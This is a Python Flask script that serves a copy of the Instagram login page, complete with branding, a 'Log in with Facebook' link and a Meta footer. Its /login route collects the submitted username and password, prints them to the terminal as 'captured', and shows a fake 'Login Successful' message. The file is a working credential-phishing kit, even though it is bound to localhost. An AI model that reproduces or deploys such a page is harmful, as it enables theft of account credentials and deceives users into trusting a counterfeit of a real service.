from flask import Flask, request, render_template_string

app = Flask(__name__)

# Full English UI with Embedded CSS
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 100%;
            padding: 0;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-section {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            margin-top: 20px;
        }

        /* Instagram Logo Text Style */
        .logo-text {
            font-family: 'serif';
            font-size: 50px;
            text-align: center;
            margin: 30px 0;
            font-style: italic;
            letter-spacing: -1px;
        }

        .form-group {
            margin-bottom: 8px;
        }

        /* Input Field Styling */
        .form-input {
            width: 100%;
            padding: 12px 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            background-color: #fafafa;
            font-size: 14px;
            outline: none;
            color: #262626;
        }

        .form-input:focus {
            border-color: #a8a8a8;
        }

        /* Login Button Styling */
        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.3s;
        }

        .login-button:active {
            opacity: 0.7;
        }

        /* Divider (OR) */
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            text-transform: uppercase;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        /* Facebook Login Link */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 25px;
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 30px;
        }

        .forgot-password a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        /* Signup Box */
        .signup-box {
            border-top: 1px solid #dbdbdb;
            padding: 25px;
            text-align: center;
            width: 100%;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        /* App Download Section */
        .get-app {
            text-align: center;
            padding: 20px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 15px;
        }

        .app-buttons img {
            height: 40px;
        }

        /* Footer Section */
        footer {
            padding: 20px;
            background-color: #fafafa;
            width: 100%;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="login-section">
            <h1 class="logo-text">Instagram</h1>

            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" class="form-input" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" class="form-input" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button">Log In</button>
            </form>

            <div class="divider">
                <span>OR</span>
            </div>

            <a href="#" class="fb-login">Log in with Facebook</a>

            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="get-app">
            <p style="color: #262626; font-size: 14px;">Get the app.</p>
            <div class="app-buttons">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <div class="copyright">
            © 2025 Instagram from Meta
        </div>
    </footer>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE_HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Print captured data in terminal
    print(f"Captured Username: {username}")
    print(f"Captured Password: {password}")
    return "<h2 style='text-align:center; font-family:sans-serif; margin-top:50px;'>Login Successful</h2>"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)
